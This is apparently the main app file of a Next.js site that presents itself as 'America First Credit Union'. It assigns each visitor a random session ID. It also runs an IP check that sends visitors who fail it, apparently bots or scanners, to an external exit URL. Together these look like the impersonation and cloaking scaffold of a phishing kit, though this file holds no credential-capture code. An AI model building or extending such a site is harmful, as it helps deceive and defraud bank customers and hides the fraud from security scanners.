import * as React from "react";
import type { AppProps } from "next/app";
import { CacheProvider, EmotionCache } from "@emotion/react";
import { ThemeProvider, CssBaseline, createTheme } from "@mui/material";
import Head from "next/head";

import "@fontsource/roboto/300.css";
import "@fontsource/roboto/400.css";
import "@fontsource/roboto/500.css";
import "@fontsource/roboto/700.css";

import createEmotionCache from "../utility/createEmotionCache";
import lightThemeOptions from "../styles/theme/lightThemeOptions";
import "../styles/globals.css";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";
import { generateString } from "../utils/generateString";
interface MyAppProps extends AppProps {
  emotionCache?: EmotionCache;
}

const clientSideEmotionCache = createEmotionCache();

const lightTheme = createTheme(lightThemeOptions);

export const DataContext = React.createContext({} as any);

const MyApp: React.FunctionComponent<MyAppProps> = (props) => {
  const { Component, emotionCache = clientSideEmotionCache, pageProps } = props;
  const [data, setData] = React.useState({
    sessionId: generateString(10),
  });

  return (
    <CacheProvider value={emotionCache}>
      <ThemeProvider theme={lightTheme}>
        <Head>
          <link rel="shortcut icon" href="/favicon.ico" />
          <title>America First Credit Union</title>
        </Head>
        <CssBaseline />
        <DataContext.Provider value={{ data, setData }}>
          <Component {...pageProps} />
        </DataContext.Provider>
      </ThemeProvider>
    </CacheProvider>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid ? {redirect: {
      destination: process.env.NEXT_PUBLIC_EXIT_URL,
      permanent: false,
    },} : {})
    
  }
}

export default MyApp;
